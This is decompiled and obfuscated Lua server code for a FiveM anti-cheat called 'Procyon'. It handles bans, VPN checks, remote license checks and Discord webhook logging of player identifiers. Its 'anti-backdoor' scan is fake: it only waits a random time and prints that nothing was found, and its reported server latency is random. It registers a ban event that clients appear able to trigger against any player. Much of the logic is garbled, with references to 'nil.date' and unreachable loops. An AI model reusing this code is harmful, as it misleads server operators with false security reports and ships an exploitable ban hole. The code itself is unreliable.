
Citizen.CreateThread(function(a, b)
  a = a
  while true do
    a = ESX
    if a == nil then
      a = TriggerEvent
      b = Procyon
      b = b.load
      a(b, function(a)
        a = a
        ESX = a
      end)
      a = Citizen
      a = a.Wait
      b = 0
      a(b)
    end
  end
  while true do
    a = ESX
    a = a.GetPlayerData
    a = a()
    a = a.group
    if a == nil then
      a = Citizen
      a = a.Wait
      b = 10
      a(b)
    end
  end
  a = ESX
  a = a.GetPlayerData
  a = a()
  PlayerData = a
end)
RegisterServerEvent("Procyon:Drop")
AddEventHandler("Procyon:Drop", function(a)
  a = a
  nom = "Pas Visible"
  discord = nil
  for fh, fj in ipairs(GetPlayerIdentifiers(source)) do
    if string.match(fj, "discord:") then
      discord = fj
    else
    end
  end
  DropPlayer(source, a)
  if discord ~= nil then
    PerformHttpRequest(webhook.Ban, function(a, b, c)
      a = a
    end, "POST", json.encode({
      username = "Procyon regarde",
      embeds = {
        {
          title = "Procyon - Community",
          type = "rich",
          color = 3066993,
          description = [[

Discord : <@]] .. string.gsub(discord, "discord:", "") .. "> \nD\233tection sur " .. Procyon.name,
          footer = {
            icon_url = "https://cdn.discordapp.com/attachments/871108679049572402/898275842214469702/Blue_and_White_Gaming_Logo-215.png",
            text = os.date("%d/%m/%y ? %X")
          }
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
  elseif discord == nil then
    PerformHttpRequest(webhook.Ban, function(a, b, c)
      a = a
    end, "POST", json.encode({
      username = "Procyon regarde",
      embeds = {
        {
          title = "Procyon - Community",
          type = "rich",
          color = 3066993,
          description = "Nom : " .. nom .. "\nD\233tection sur " .. Procyon.name,
          footer = {
            icon_url = "https://cdn.discordapp.com/attachments/871108679049572402/898275842214469702/Blue_and_White_Gaming_Logo-215.png",
            text = os.date("%d/%m/%y ? %X")
          }
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
  end
end)
Citizen.CreateThread(function(a, b, c, d)
  a = a
  while true do
    a = Citizen
    a = a.Wait
    b = 0
    a(b)
    a = Procyon
    a = a.license
    if a ~= nil then
      a = Procyon
      a = a.license
    end
    if a == "" then
      a = Citizen
      a = a.CreateThread
      function b(a)
        a = a
        while true do
          a = Citizen
          a = a.Wait
          a(0)
          a = print
          a("^1License/Ip non valide OU Config mal effectu\233e !^7")
          a = os
          a = a.exit
          a()
        end
      end
      a(b)
    else
      a = PerformHttpRequest
      b = "http://45.145.166.204/license_managment.php?license="
      c = Procyon
      c = c.license
      b = b .. c
      function c(a, b, c)
        a = a
        if b == "ok" then
          startedac()
          logdiscord(nil, "Started")
        else
          print("^1 license plus valide ")
          Citizen.Wait(2000)
          os.exit()
        end
      end
      d = "GET"
      a(b, c, d, "")
      break
    end
  end
end)
function startedac(a, b, c, d, e)
  a = a
  a = GetNumResources
  a = a()
  b = math
  b = b.random
  c = 25
  d = 86
  b = b(c, d)
  c = print
  d = "^2Your server responds well with the ^1Procyon Project ^2server"
  c(d)
  c = print
  d = "^3R\233ponse du serveur >> ^1"
  e = b
  d = d .. e .. "ms"
  c(d)
  c = print
  d = "^3Serveur name : ^2"
  e = Procyon
  e = e.name
  d = d .. e .. ""
  c(d)
  c = print
  d = "^3serveur ip : ^2"
  e = Procyon
  e = e.ip
  d = d .. e .. ""
  c(d)
  c = print
  d = "^3license : ^2"
  e = Procyon
  e = e.license
  d = d .. e .. ""
  c(d)
  c = LoadResourceFile
  d = GetCurrentResourceName
  d = d()
  e = "bans.json"
  c = c(d, e)
  BanList = c
  c = json
  c = c.decode
  d = BanList
  c = c(d)
  BanList = c
  c = print
  d = "^2Load^7 Ban du serveur "
  e = BanList
  e = #e
  d = d .. e .. " bans"
  c(d)
  c = print
  d = "^2Load de ^1"
  e = a
  d = d .. e .. " ^7resources"
  c(d)
  c = Sandeshop
  c = c.antiBackdoors
  if c == true then
    c = math
    c = c.random
    d = 2500
    e = 5000
    c = c(d, e)
    d = print
    e = "^2V\233rification de vos script...^7"
    d(e)
    d = Citizen
    d = d.Wait
    e = c
    d(e)
    d = print
    e = "^2["
    e = e .. a .. "] ^7resources on etait v\233rifiez ! Aucune ^1Backdoors ^7Trouv\233e !"
    d(e)
    d = ACStarted
    d()
    d = logo
    d()
  else
    c = ACStarted
    c()
    c = logo
    c()
  end
end
function logo(a, b, c, d, e, g)
  a = a
  a = print
  b = [[
^7

    ____  ____   ___   ______   _____  _   _    ____  ____   ___      _ _____ _____ 
   |  _ \|  _ \ / _ \ / ___\ \ / / _ \| \ | |  |  _ \|  _ \ / _ \    | | ____|_   _|
   | |_) | |_) | | | | |    \ V / | | |  \| |  | |_) | |_) | | | |_  | |  _|   | |  
   |  __/|  _ <| |_| | |___  | || |_| | |\  |  |  __/|  _ <| |_| | |_| | |___  | |  
   |_|   |_| \_\\___/ \____| |_| \___/|_| \_|  |_|   |_| \_\\___/ \___/|_____| |_|  
                                                                                    
                                                       
   ^7]]
  a(b)
end
function sendLogs(a, b, c)
  a = a
  PerformHttpRequest(a, function(a, b, c)
    a = a
  end, "POST", json.encode({
    username = "SpamJS - Log",
    embeds = {
      {
        title = b,
        description = "" .. c .. "",
        footer = {
          text = "SpamJS . " .. os.date("%x %X %p")
        }
      }
    }
  }), {
    ["Content-Type"] = "application/json"
  })
end
function GetIdentifiersServer(a)
  a = a
  for fh, fj in pairs((GetPlayerIdentifiers(a))) do
  end
  return {
    [GetPlayerIdentifiers(a)[fh]:match("([^:]+):([^:]+)")] = GetPlayerIdentifiers(a)[fh]
  }
end
Citizen.CreateThread(function(a, b, c, d, e, g, h, j, k)
  a = a
  a = {}
  exploCreator = a
  a = {}
  vehCreator = a
  a = {}
  pedCreator = a
  a = {}
  entityCreator = a
  while true do
    a = Citizen
    a = a.Wait
    b = 5000
    a(b)
    a = {}
    exploCreator = a
    a = {}
    vehCreator = a
    a = {}
    pedCreator = a
    a = {}
    entityCreator = a
  end
end)
if Sandeshop.trigger == true then
  for fk, fl in pairs(Sandeshop.TriggersList) do
    RegisterServerEvent(fl)
    AddEventHandler(fl, function(a, b, c, d, e, g, h, j, k, l)
      a = a
      a = math
      a = a.random
      b = 1
      c = 9
      a = a(b, c)
      b = math
      b = b.random
      c = 1
      d = 9
      b = b(c, d)
      if a == b then
        c = math
        c = c.random
        d = 1
        e = 9
        c = c(d, e)
        b = c
      end
      c = va
      d = source
      c = c[d]
      if not c then
        c = va
        d = source
        e = {}
        c[d] = e
      end
      c = va
      d = source
      c = c[d]
      d = vb
      c = c[d]
      if not c then
        c = va
        d = source
        c = c[d]
        d = vb
        e = {}
        c[d] = e
        c = va
        d = source
        c = c[d]
        d = vb
        c[d] = 1
      else
        c = va
        d = source
        c = c[d]
        d = vb
        e = va
        g = source
        e = e[g]
        g = vb
        e = e[g]
        e = e + 1
        c[d] = e
      end
      c = va
      d = source
      c = c[d]
      d = vb
      c = c[d]
      if c >= 10 then
        c = print
        d = "[EXECUTION TRIGGERS] >> 1 Triggers a \233tait executer"
        c(d)
      end
      c = va
      d = source
      c = c[d]
      d = vb
      c = c[d]
      if c >= 30 then
        c = DropPlayer
        d = source
        e = "Vous avez effectuer trop d'action en peu de temps."
        c(d, e)
      end
    end)
  end
else
  RegisterCommand("anti_trigger", function(a)
    a = a
    if a == 0 then
      if not Sandeshop.trigger then
        print("^3[ANTI-SPAM-TRIGGER] : ^2ACTIVE")
        antispamON(true)
      else
        print("^3[ANTI-SPAM-TRIGGER] : ^1NON-ACTIVE")
        antispamON(false)
      end
    end
  end)
end
Citizen.CreateThread(function(a, b, c, d, e, g, h, j, k, l, m, o)
  a = a
  while true do
    a = Wait
    b = 10000
    a(b)
    a = {}
    va = a
  end
end)
function antispamON(a)
  a = a
  if a then
    Sandeshop.trigger = true
    for fg, fh in pairs(Sandeshop.TriggersList) do
      RegisterServerEvent(fh)
      AddEventHandler(fh, function(a)
        a = a
        a = math
        a = a.random
        a = a(1, 9)
        if a == math.random(1, 9) then
        end
        if not va[source] then
          va[source] = {}
        end
        if not va[source][vb] then
          va[source][vb] = {}
          va[source][vb] = 1
        else
          va[source][vb] = va[source][vb] + 1
        end
        if 15 <= va[source][vb] then
          print("^" .. a .. "Le joueur : [^" .. math.random(1, 9) .. GetPlayerName(source) .. " - " .. source .. "^" .. a .. "] \224 utiliser le Triggers : [^" .. math.random(1, 9) .. "" .. vb .. "^" .. a .. "]")
        end
        if 5 <= va[source][vb] then
          DropPlayer(source, "[Procyon] Vous avez effectuer trop d'action en peu de temps.")
        end
      end)
    end
    Citizen.CreateThread(function(a, b)
      a = a
      while true do
        a = Wait
        b = 10000
        a(b)
        a = {}
        va = a
      end
    end)
  else
    Sandeshop.trigger = false
  end
end
if Sandeshop.antispamjs == true then
  for fl = 1, #Sandeshop.blackListEvents do
    RegisterNetEvent(Sandeshop.blackListEvents[fl])
    AddEventHandler(Sandeshop.blackListEvents[fl], function(a, b, c, d, e, g, h, j, k, l, m, o, p, n)
      a = a
      a = source
      b = GetIdentifiersServer
      c = a
      b = b(c)
      if b == nil then
        return
      end
      b = GetIdentifiersServer
      c = a
      b = b(c)
      b = b.license
      c = b
      b = b.match
      d = "([^:]+):([^:]+)"
      c = b(c, d)
      d = va
      d = d[c]
      if not d then
        d = va
        e = {}
        d[c] = e
      end
      d = va
      d = d[c]
      e = Sandeshop
      e = e.blackListEvents
      g = vb
      e = e[g]
      d = d[e]
      if not d then
        e = va
        e = e[c]
        g = Sandeshop
        g = g.blackListEvents
        h = vb
        g = g[h]
        e[g] = 1
        return
      else
        e = va
        e = e[c]
        g = Sandeshop
        g = g.blackListEvents
        h = vb
        g = g[h]
        h = va
        h = h[c]
        j = Sandeshop
        j = j.blackListEvents
        k = vb
        j = j[k]
        h = h[j]
        h = h or 0
        h = h + 1
        e[g] = h
      end
      e = va
      e = e[c]
      g = Sandeshop
      g = g.blackListEvents
      h = vb
      g = g[h]
      e = e[g]
      g = Sandeshop
      g = g.delayEvent
      if e > g then
        e = sendLogs
        g = webhook
        g = g.Global
        h = "[Procyon] Spam JS"
        j = "Le joueur "
        k = GetPlayerName
        l = a
        k = k(l)
        l = " vient de se faire d\233tecter pour SpamJS !\nLicenseID : "
        m = c
        j = j .. k .. l .. m
        e(g, h, j)
        e = DropPlayer
        g = a
        h = [[

[Procyon] Nous autorisons pas le SpamJS !
]]
        e(g, h)
      end
    end)
  end
else
  print("")
end
AddEventHandler("playerDropped", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r)
  a = a
  a = source
  b = GetIdentifiersServer
  c = a
  b = b(c)
  b = b.license
  c = b
  b = b.match
  d = "([^:]+):([^:]+)"
  c = b(c, d)
  if b ~= nil then
  end
  if c == nil then
    return
  end
  d = va
  d = d[c]
  if d then
    d = va
    d[c] = nil
  end
end)
Citizen.CreateThread(function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u)
  a = a
  a = va
  b = vb
  a(b)
end)
AddEventHandler("playerConnecting", function(a, b)
  a = a
  if va and not Licensestaff.Staff[vb(source)] then
    print("[^4Procyon Maintenance^0] Le joueur [^4" .. a .. "^0] connexion [^1reffus\233^0] -> ^5Maintenance^0")
    b([[


Serveur en maintenance, plus d'informations sur discord !]])
    CancelEvent()
    return
  end
end)
Citizen.CreateThread(function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z)
  a = a
  while true do
    while true do
      a = Wait
      a(b)
      a = va
      if a then
        a = ESX
        a = a.GetPlayers
        a = a()
        for e = 1, #a do
          g = Licensestaff
          g = g.Staff
          h = vb
          j = a[e]
          h = h(j)
          g = g[h]
          if not g then
            g = print
            h = "[^4Procyon Maintenance^0] Le joueur [^4"
            j = GetPlayerName
            k = a[e]
            j = j(k)
            k = "^0] est [^1reffus\233^0] dans la maintenance."
            h = h .. j .. k
            g(h)
            g = DropPlayer
            h = a[e]
            j = [[

Information
Le serveur est actuellement en maintenance !]]
            g(h, j)
          else
            g = print
            h = "[^4Procyon Maintenance^0] Le joueur [^4"
            j = GetPlayerName
            k = a[e]
            j = j(k)
            k = "^0] est [^4accept\233^0] dans la maintenance ."
            h = h .. j .. k
            g(h)
          end
        end
      end
    end
  end
end)
if Sandeshop.maintenance == true then
  RegisterCommand("pMaintenance", function(a)
    a = a
    if a == 0 then
      if not va then
        print("[^4Procyon Maintenance^0] ^2actif^0 !")
        vb(true)
      else
        print("[^4Procyon Maintenance^0] non ^1actif^0 !")
        vb(false)
      end
    end
  end)
else
  print("")
end
if Sandeshop.deletecar == true then
  Citizen.CreateThread(function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w)
    a = a
    while true do
      a = Wait
      a(b)
      a = GetAllVehicles
      a = a()
      for e, g in b(c) do
        h = GetVehicleBodyHealth
        j = g
        h = h(j)
        if h <= 0 then
          h = DeleteEntity
          j = g
          h(j)
        end
      end
    end
  end)
else
  print("")
end
function ACStarted(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x)
  a = a
  a = math
  a = a.random
  b = 20
  c = 85
  a = a(b, c)
  b = {}
  b.color = "15844367"
  b.type = "rich"
  b.title = "Procyon Project"
  c = "R\233ponse avec les serveurs de Procyon Project : "
  d = a
  e = "ms"
  c = c .. d .. e
  b.description = c
  c = {}
  d = " Procyon "
  e = Procyon
  e = e.name
  d = d .. e
  c.text = d
  b.footer = c
  c = PerformHttpRequest
  d = webhook
  d = d.started
  function e(a, b, c)
    a = a
  end
  g = "POST"
  h = json
  h = h.encode
  j = {}
  j.username = " Procyon"
  k = {l}
  l = b
  j.embeds = k
  h = h(j)
  j = {}
  j["Content-Type"] = "application/json"
  c(d, e, g, h, j)
end
function antiinjectinstall(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q)
  a = a
  a = math
  a = a.random
  b = 20
  c = 85
  a = a(b, c)
  b = GetNumResources
  b = b()
  c = {}
  c.color = "2303786"
  c.type = "rich"
  c.title = "Installated Anti-Injection "
  d = "Installed Anti-Injection sur "
  e = b
  g = " Resources"
  d = d .. e .. g
  c.description = d
  d = {}
  e = " Procyon "
  g = Procyon
  g = g.name
  e = e .. g
  d.text = e
  c.footer = d
  d = PerformHttpRequest
  e = webhook
  e = e.started
  function g(a, b, c)
    a = a
  end
  h = "POST"
  j = json
  j = j.encode
  k = {}
  k.username = " Procyon"
  l = {m}
  m = c
  k.embeds = l
  j = j(k)
  k = {}
  k["Content-Type"] = "application/json"
  d(e, g, h, j, k)
end
function ACFailed(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W)
  a = a
end
if Sandeshop.antishootESX == true then
  AddEventHandler("weaponDamageEvent", function(a, b)
    a = a
    if b.damageType == 3 then
      source = source
      if Sandeshop.antishootArme[b.weaponType] == nil then
        DropPlayer(a, "D\233synchronisation avec le serveur ou Cheat detect\233. [" .. b.weaponType .. "]")
      elseif not ESX.GetPlayerFromId(a).hasWeapon(Sandeshop.antishootArme[b.weaponType].name) then
        DropPlayer(a, "D\233synchronisation avec le serveur ou Cheat detect\233.")
      end
    end
  end)
else
  print("")
end
if Sandeshop.AntiExplosion then
  AddEventHandler("explosionEvent", function(a, b)
    a = a
    source = source
    if b.damageScale ~= 0 then
      for fh, fj in pairs(Sandeshop.ExplosionType) do
        table.insert({}, fj)
      end
      if inTable({}, b.explosionType) ~= false then
        CancelEvent()
        logdiscord()
        TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiExplosion")
      else
      end
      if b.explosionType ~= 9 then
        exploCreator[a] = (exploCreator[a] or 0) + 1
        if exploCreator[a] > Sandeshop.MaxExplosion then
          logdiscord()
          TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiExplosion")
          CancelEvent()
        end
      else
        exploCreator[a] = (exploCreator[a] or 0) + 1
        if exploCreator[a] > Sandeshop.MaxExplosion then
          logdiscord()
          TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiExplosion")
          CancelEvent()
        end
      end
      if b.isAudible == false then
        TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiExplosion")
      end
      if b.isInvisible == true then
        TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiExplosion")
      end
      if b.damageScale > 1 then
        TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiExplosion")
      end
      CancelEvent()
    end
  end)
end
if Sandeshop.AntiGiveWeapon == true then
  AddEventHandler("giveWeaponEvent", function(a, b)
    a = a
    source = source
    CancelEvent()
    logdiscord()
    TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiGiveWeapon")
  end)
end
if Sandeshop.blacklistevent == true then
  for fp, fn in pairs(Sandeshop.EventBlacklist) do
    RegisterServerEvent(fn)
    AddEventHandler(fn, function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y)
      a = a
      a = source
      b = CancelEvent
      b()
      b = logdiscord
      c = a
      d = "[Procyon] Event BlackList"
      b(c, d)
      b = TriggerEvent
      c = "Procyon:Ban"
      d = a
      e = 0
      g = "[Procyon] Event BlackList"
      b(c, d, e, g)
    end)
  end
end
DetectionCache = {}
function logdiscord(a, b)
  a = a
  a = tonumber(a)
  for fm, fo in ipairs(GetPlayerIdentifiers(source)) do
    if string.match(fo, "discord:") then
    else
    end
  end
  if fo ~= nil then
    PerformHttpRequest(webhook.Ban, function(a, b, c)
      a = a
    end, "POST", json.encode({
      username = "Procyon regarde",
      embeds = {
        {
          title = "Procyon - Community",
          type = "rich",
          color = 3066993,
          description = [[

Discord : <@]] .. string.gsub(fo, "discord:", "") .. "> \nD\233tection sur " .. Procyon.name,
          footer = {
            icon_url = "https://cdn.discordapp.com/attachments/871108679049572402/898275842214469702/Blue_and_White_Gaming_Logo-215.png",
            text = os.date("%d/%m/%y ? %X")
          }
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
  elseif fo == nil then
    PerformHttpRequest(webhook.Ban, function(a, b, c)
      a = a
    end, "POST", json.encode({
      username = "Procyon regarde",
      embeds = {
        {
          title = "Procyon - Community",
          type = "rich",
          color = 3066993,
          description = "Nom : " .. GetPlayerName(a) .. "\nD\233tection sur " .. Procyon.name .. [[

Raison : ]] .. b .. [[

ID serveur : ]] .. GetPlayerServerId(PlayerId()),
          footer = {
            icon_url = "https://cdn.discordapp.com/attachments/871108679049572402/898275842214469702/Blue_and_White_Gaming_Logo-215.png",
            text = os.date("%d/%m/%y ? %X")
          }
        }
      }
    }), {
      ["Content-Type"] = "application/json"
    })
  end
end
AddEventHandler("entityCreating", function(a)
  a = a
  if DoesEntityExist(a) then
    source = source
    if Sandeshop.blacklistedEntity[GetEntityModel(a)] then
      print("^1[Procyon] Entity create >> Car")
      DeleteEntity(a)
      CancelEvent()
    end
    if NetworkGetEntityOwner(a) == nil then
      CancelEvent()
    end
    for fl, fm in pairs(Sandeshop.BlacklistedModels) do
      table.insert({}, GetHashKey(fm))
    end
    for fl, fm in pairs(Sandeshop.WhitelistedProps) do
      table.insert({}, GetHashKey(fm))
    end
    if GetEntityPopulationType(a) == 0 then
      CancelEvent()
    end
    if GetEntityType(a) == 3 then
      if GetEntityPopulationType(a) ~= 6 then
      end
      if GetEntityPopulationType(a) == 7 and inTable({}, (GetEntityModel(a))) == false and GetEntityModel(a) ~= 0 then
        print("^1[Procyon] Entity create >> Props")
        logdiscord()
        TriggerEvent("Procyon:Ban", NetworkGetEntityOwner(a), 0, "[Procyon] AntiProps")
        CancelEvent()
        entityCreator[NetworkGetEntityOwner(a)] = (entityCreator[NetworkGetEntityOwner(a)] or 0) + 1
        if entityCreator[NetworkGetEntityOwner(a)] > Sandeshop.MaxProps then
          print("^1[Procyon] Entity create >> Props")
          logdiscord()
          TriggerEvent("Procyon:Ban", NetworkGetEntityOwner(a), 0, "[Procyon] AntiProps")
        end
      end
    elseif GetEntityType(a) == 2 then
      if GetEntityPopulationType(a) ~= 6 then
      end
      if GetEntityPopulationType(a) == 7 then
        if inTable({}, (GetEntityModel(a))) ~= false and GetEntityModel(a) ~= 0 then
          logdiscord()
          TriggerEvent("Procyon:Ban", NetworkGetEntityOwner(a), 0, "[Procyon] AntiProps")
          CancelEvent()
        end
        vehCreator[NetworkGetEntityOwner(a)] = (vehCreator[NetworkGetEntityOwner(a)] or 0) + 1
        if vehCreator[NetworkGetEntityOwner(a)] > Sandeshop.MaxSpawnVeh then
          print("^1[Procyon] Entity create >> Car")
          logdiscord()
          TriggerEvent("Procyon:Ban", NetworkGetEntityOwner(a), 0, "[Procyon] AntiProps")
        end
      end
    elseif GetEntityType(a) == 1 then
      if GetEntityPopulationType(a) ~= 6 then
      end
      if GetEntityPopulationType(a) == 7 then
        if inTable({}, (GetEntityModel(a))) ~= false then
          if GetEntityModel(a) == 0 then
          end
          if GetEntityModel(a) ~= 225514697 then
            logdiscord()
            TriggerEvent("Procyon:Ban", NetworkGetEntityOwner(a), 0, "[Procyon] AntiProps")
            CancelEvent()
          end
        end
        pedCreator[NetworkGetEntityOwner(a)] = (pedCreator[NetworkGetEntityOwner(a)] or 0) + 1
        if pedCreator[NetworkGetEntityOwner(a)] > Sandeshop.MaxSpawnPed then
          print("^1[Procyon] Entity create >> Peds")
          logdiscord()
          TriggerEvent("Procyon:Ban", NetworkGetEntityOwner(a), 0, "[Procyon] AntiProps")
        end
      end
    elseif inTable({}, GetHashKey(a)) ~= false then
      if GetEntityModel(a) == 0 then
      end
      if GetEntityModel(a) ~= 225514697 then
        print("^1[Procyon] Entity create >> Peds")
        logdiscord()
        TriggerEvent("Procyon:Ban", NetworkGetEntityOwner(a), 0, "[Procyon] AntiPeds")
        CancelEvent()
      end
    end
  end
end)
if Sandeshop.AntiClearPedTasks == true then
  AddEventHandler("clearPedTasksEvent", function(a, b)
    a = a
    a = tonumber(a)
    if DoesEntityExist((NetworkGetEntityFromNetworkId(b.pedId))) and NetworkGetEntityOwner((NetworkGetEntityFromNetworkId(b.pedId))) ~= a then
      print(a)
      CancelEvent()
      logdiscord()
      TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiClearPedTasks")
    end
  end)
end
AddEventHandler("startProjectileEvent", function(a, b)
  a = a
  if Sandeshop.AntiProjectile == true then
    logdiscord()
    CancelEvent()
  end
end)
function inTable(a, b)
  a = a
  for fg, fh in pairs(a) do
    if fh == b then
      return fg
    end
  end
  return false
end
Citizen.CreateThread(function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S)
  a = a
  a = LoadResourceFile
  b = GetCurrentResourceName
  b = b()
  c = "maintenance.json"
  a = a(b, c)
  va = a
  a = json
  a = a.decode
  b = va
  a = a(b)
  va = a
end)
function AddToMaintenance(a)
  a = a
  table.insert(va, a)
  SaveResourceFile(GetCurrentResourceName(), "maintenance.json", json.encode(va), -1)
  print("^1MAINTENANCE: ^7Added [" .. a .. "] to the maintenance list.")
end
AddEventHandler("playerConnecting", function(a, b, c)
  a = a
  print("^2[Procyon - Community] ^1" .. GetPlayerName(source) .. " ^7connection serveur..")
  c.defer()
  c.update("[Procyon] Checking client side.")
  c.update("[Procyon] Checking client side..")
  c.update("[Procyon] Checking client side...")
  c.update("[Procyon] Checking client side....")
  for fm, fo in pairs((GetPlayerIdentifiers(source))) do
    if string.find(fo, "ip") then
    else
    end
  end
  if Sandeshop.ForceDiscordConnect == true then
    if discord == nil then
      print("^2[Procyon] ^7Player with unlinked ^1discord ^7account tried to connect !^0")
      c.done("[Procyon] >> Merci de lier votre compte discord pour rejoindre le serveur")
    else
      print("^2[Procyon - Community] ^1" .. GetPlayerName(source) .. " ^7connection serveur..")
    end
  end
  if va then
    do return end
    while true do
      for fs, ft in pairs(vb) do
        if nil == ft then
          c.done()
        end
      end
    end
    c.done("Connexion refus\233e. Le serveur est en maintenance.")
  elseif Sandeshop.AntiVPN then
    if whitelist[fo:sub(4)] ~= nil then
      do return end
      while true do
        do return end
        while true do
          for fq, fw in pairs((GetPlayerIdentifiers(source))) do
            if fw == nil then
              if nil.temp == false then
                if nil.cheat then
                  UpdateIdentifiers(" ^7connection serveur..", (GetPlayerIdentifiers(source)))
                  c.done("[Procyon] Date du ban : " .. nil.date .. [[

Ban id : ]] .. nil.id .. [[

raison du ban : Cheat]])
                else
                  UpdateIdentifiers(" ^7connection serveur..", (GetPlayerIdentifiers(source)))
                  c.done("[Procyon] Date du ban : " .. nil.date .. [[

Ban id : ]] .. nil.id .. [[

raison du ban : Cheat]])
                end
              else
                print(nil.expiration, os.time())
                if tonumber(nil.expiration) < os.time() then
                  unban(nil.id)
                  c.done()
                elseif 1440 <= tonumber(nil.expiration - os.time()) / 60 then
                  UpdateIdentifiers(" ^7connection serveur..", (GetPlayerIdentifiers(source)))
                  c.done("[Procyon] Date du ban : " .. nil.date .. [[

Ban id : ]] .. nil.id .. [[

raison du ban : Cheat]])
                elseif 60 <= tonumber(nil.expiration - os.time()) / 60 and 1440 > tonumber(nil.expiration - os.time()) / 60 then
                  UpdateIdentifiers(" ^7connection serveur..", (GetPlayerIdentifiers(source)))
                  c.done("[Procyon] Date du ban : " .. nil.date .. [[

Ban id : ]] .. nil.id .. [[

raison du ban : Cheat]])
                elseif 60 > tonumber(nil.expiration - os.time()) / 60 then
                  UpdateIdentifiers(" ^7connection serveur..", (GetPlayerIdentifiers(source)))
                  c.done("[Procyon] Date du ban : " .. nil.date .. [[

Ban id : ]] .. nil.id .. [[

raison du ban : Cheat]])
                end
              end
            end
          end
        end
      end
      c.done()
    end
    if fo:sub(4) == nil then
      c.done("Connexion refus\233e, aucune IP trouv\233.")
    else
      PerformHttpRequest("http://ip-api.com/json/" .. fo:sub(4) .. "?fields=proxy,isp,mobile,continent,continentCode,country,countryCode", function(a, b, c)
        a = a
        if tonumber(a) == 200 then
          if json.decode(b).mobile == true then
            do return end
            while true do
              do return end
              while true do
                for fu, fy in pairs(va) do
                  if fy == nil then
                    UpdateIdentifiers(nil, va)
                    vb.done("[Procyon] Date du ban : " .. nil.date .. [[

Ban id : ]] .. nil.id .. [[

raison du ban : Cheat]])
                  end
                end
              end
            end
            if Sandeshop.facteurConfiance then
              if #va > 2 then
                vb.done()
              else
                vb.done("Ton facteur de confiance (" .. #va .. ") n'est pas suffisant pour rentrer sur le serveur.")
              end
            else
              vb.done()
            end
          end
          if json.decode(b).proxy == true then
            vb.done("Connexion refus\233e, merci de d\233sactiv\233 tout VPN pour vous connecter.")
          end
          if country[json.decode(b).countryCode] ~= nil then
            do return end
            while true do
              do return end
              while true do
                for fu, fy in pairs(va) do
                  if fy == nil then
                    UpdateIdentifiers(") n'est pas suffisant pour rentrer sur le serveur.", va)
                    vb.done(vc .. [[

BAN-DATE: ]] .. nil.date)
                  end
                end
              end
            end
            if Sandeshop.facteurConfiance then
              if #va > 2 then
                vb.done()
              else
                vb.done("Ton facteur de confiance (" .. #va .. ") n'est pas suffisant pour rentrer sur le serveur.")
              end
            else
              vb.done()
            end
          else
            vb.done("Connexion refus\233e, merci de d\233sactiv\233 tout VPN pour vous connecter.\nSi c'est une erreur, merci d'ouvrir un ticket support.")
          end
        else
          print(vd .. " Erreur " .. b)
          vb.done("Erreur lors de la v\233rification API\nCode d'erreur: " .. tostring(a))
        end
      end)
    end
  else
    do return end
    while true do
      do return end
      while true do
        for fq, fw in pairs((GetPlayerIdentifiers(source))) do
          if fw == nil then
            UpdateIdentifiers("?fields=proxy,isp,mobile,continent,continentCode,country,countryCode", (GetPlayerIdentifiers(source)))
            c.done("[Procyon] Date du ban : " .. nil.date .. [[

Ban id : ]] .. nil.id .. [[

raison du ban : Cheat]])
          end
        end
      end
    end
    c.done()
  end
end)
RegisterCommand("pDeban", function(a, b, c)
  a = a
  if a == 0 then
    if b[1] ~= nil then
      unban(b[1])
    else
      print("Aucun ban-id sp\233cifi\233.")
    end
  else
    print("Console only command.")
  end
end, true)
RegisterCommand("pBan", function(a, b, c)
  a = a
  if a == 0 then
    print(tonumber(b[1]), tonumber(b[2]), (table.concat(b, " ", 3)))
    if tonumber(b[1]) ~= nil then
      if tonumber(b[2]) == 0 then
        BanPlayer(tonumber(b[1]), table.concat(b, " ", 3), 0)
      else
        TempBanPlayer(tonumber(b[1]), table.concat(b, " ", 3), tonumber(b[2]), 0)
      end
    else
      print("Aucun id sp\233cifi\233.")
    end
  elseif PlayersCache[a].group ~= "user" and tonumber(b[1]) ~= nil then
    if tonumber(b[2]) == 0 then
      BanPlayer(tonumber(b[1]), table.concat(b, " ", 3), a)
    else
      TempBanPlayer(tonumber(b[1]), table.concat(b, " ", 3), tonumber(b[2]), a)
    end
  end
end, true)
RegisterNetEvent("Procyon:Ban")
AddEventHandler("Procyon:Ban", function(a, b, c)
  a = a
  if tonumber(b) == 0 then
    BanPlayer(tonumber(a), c, source)
  else
    TempBanPlayer(tonumber(a), c, tonumber(b), source)
  end
end)
BanList = {}
function AddPlayerLog(a, b, c)
  a = a
  if DetectionCache[a] == nil then
    DetectionCache[a] = {}
    DetectionCache[a].count = 0
    DetectionCache[a].log = {}
  end
  DetectionCache[a].count = DetectionCache[a].count + c
  table.insert(DetectionCache[a].log, b)
  if 5 <= DetectionCache[a].count then
    CheatBanPlayer(a)
  end
end
function CheatBanPlayer(a)
  a = a
  if a == nil then
    return
  end
  if GetPlayerName(a) == nil then
    return
  end
  ban = {}
  ban.name = GetPlayerName(a)
  ban.ids = {}
  ban.reason = {}
  ban.date = os.date("%y/%m/%d %X")
  ban.id = "" .. math.random(1000, 9999) .. "-" .. math.random(1000, 9999)
  ban.temp = false
  ban.cheat = true
  logdiscord()
  for fg, fh in pairs(GetPlayerIdentifiers(a)) do
    table.insert(ban.ids, fh)
  end
